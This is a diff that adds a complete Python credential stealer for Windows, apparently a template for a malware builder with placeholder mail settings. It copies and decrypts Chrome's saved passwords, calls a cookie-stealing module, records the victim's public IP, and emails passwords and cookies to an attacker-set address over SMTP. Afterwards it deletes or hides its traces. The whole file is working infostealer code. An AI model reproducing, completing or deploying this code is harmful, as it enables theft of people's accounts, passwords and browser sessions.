@@ -1,0 +1,140 @@
+import ctypes
+import smtplib
+import os
+import win32crypt
+import urllib
+import socket
+import queue
+from _malkit import cookiesteal
+from shutil import copyfile
+from subprocess import check_call
+from sqlite3 import connect
+from requests import get, post
+from email.utils import formatdate
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+
+
+appdata=os.getenv("APPDATA")
+destination = f"{appdata}\\error.txt"
+cookies_file = f"{appdata}\\cookies.json"
+cookies_file_email = f"{appdata}\\cookies_email.json"
+
+
+def getpass():
+
+	path = os.getenv("LOCALAPPDATA") + \
+		"\\Google\\Chrome\\User Data\\Default\\Login Data"
+
+	path2 = os.getenv("LOCALAPPDATA") + \
+		"\\Google\\Chrome\\User Data\\Default\\Login2"
+
+	ASCII_TRANS = '_' * 32 + ''.join([chr(x)
+									  for x in range(32, 126)]) + '_' * 130
+	path = path.strip()
+	path = urllib.parse.unquote(path)
+	if path.translate(ASCII_TRANS) != path:	 # Contains non-ascii
+		path = path.decode('latin-1')
+	path = urllib.request.url2pathname(path)
+
+	ASCII_TRANS = '_' * 32 + ''.join([chr(x)
+									  for x in range(32, 126)]) + '_' * 130
+	path2 = path2.strip()
+	path2 = urllib.parse.unquote(path2)
+	if path2.translate(ASCII_TRANS) != path2:  # Contains non-ascii
+		path2 = path2.decode('latin-1')
+	path2 = urllib.request.url2pathname(path2)
+	try:
+		copyfile(path, path2)
+	except:
+		pass
+
+	conn = connect(path2)
+
+	cursor = conn.cursor()
+
+	cursor.execute(
+		'SELECT action_url, username_value, password_value FROM logins')
+
+	if os.path.exists(destination):
+		os.remove(destination)
+
+	sites = []
+	for raw in cursor.fetchall():
+		try:
+			if raw[0] not in sites:
+				if os.path.exists(destination):
+					with open(destination, "a") as password:
+						password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
+									   '\n' + "Password: " +
+									   win32crypt.CryptUnprotectData(raw[2])[1].decode("utf-8") + '\n')
+				else:
+					with open(destination, "w") as password:
+						password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
+									   '\n' + "Password: " +
+									   win32crypt.CryptUnprotectData(raw[2])[1].decode("utf-8") + '\n')
+				sites.append(raw[0])
+		except:
+			continue
+
+	conn.close()
+	return 0
+
+def create_attachment(filename):
+	try:
+		with open(filename) as f:
+			attachment = MIMEText(f.read())
+			
+			attachment.add_header('Content-Disposition',
+								'attachment', filename=filename)
+		return attachment
+	except Exception as err:
+		pass
+
+def sendpass():
+	host_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
+	mailto="<<MAILTO>>"
+	email = "<<EMAIL>>"
+	pwd = "<<PASSWORD>>"
+	server = "<<SERVER>>"
+	msg = MIMEMultipart()
+	password_file = destination
+	try:
+		saved_passwords=create_attachment(password_file)
+		cookies_all = create_attachment(cookies_file)
+		cookies_email = create_attachment(cookies_file_email)
+	except Exception as err:
+		pass
+	msg['Subject'] = f'{host_ip}'
+	msg['From'] = "Chromepass <chromepass@itsec.bz>"
+	msg['To'] = mailto
+	msg["Date"] = formatdate(localtime=True)
+	msg.attach(saved_passwords)
+	try:
+		msg.attach(cookies_all)
+		msg.attach(cookies_email)
+	except Exception as e:
+		pass
+	mailer = smtplib.SMTP(server, 587)
+	mailer.starttls()
+	mailer.login(email, pwd)
+	mailer.sendmail(email, mailto, msg.as_string())
+	mailer.close()
+
+
+getpass()
+cookiesteal.cookiesteal()
+sendpass()
+
+files = [destination, cookies_file, cookies_file_email]
+for file in files:
+	try:
+		os.remove(file)
+	except:
+		check_call(["attrib", "+H", file])
+
+	
+<<ERROR>>
+
+
